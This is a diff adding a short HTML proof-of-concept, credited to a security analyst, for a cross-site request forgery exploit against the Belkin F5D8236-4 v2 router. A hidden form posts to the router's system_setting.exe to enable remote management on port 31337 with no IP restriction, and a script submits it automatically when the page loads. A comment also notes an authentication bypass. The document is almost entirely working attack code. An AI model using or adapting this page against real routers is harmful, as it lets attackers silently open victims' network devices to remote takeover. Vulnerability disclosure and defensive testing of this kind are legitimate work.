@@ -1,0 +1,25 @@
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Belkin F5D8236-4 v2 CSRF - Enable Remote MGMT.&lt;/title&gt;
+&lt;!-- Use JavaScript debugging to bypass authentication --&gt;
+&lt;!--*Discovered by: Jacob Holcomb 
+	- Security Analyst @ Independent Security Evaluators --&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form name=&quot;belkin&quot; action=&quot;http://X.X.X.X/cgi-bin/system_setting.exe&quot; 
+	method=&quot;post&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remote_mgmt_enabled&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remote_mgmt_port&quot; value=&quot;31337&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;allow_remote_ip&quot; value=&quot;0&quot;/&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+function BeLkIn() {document.belkin.submit();}; 
+window.setTimeout(BeLkIn, 0000);
+&lt;/script&gt;
+
+&lt;body&gt;
+&lt;/html&gt;
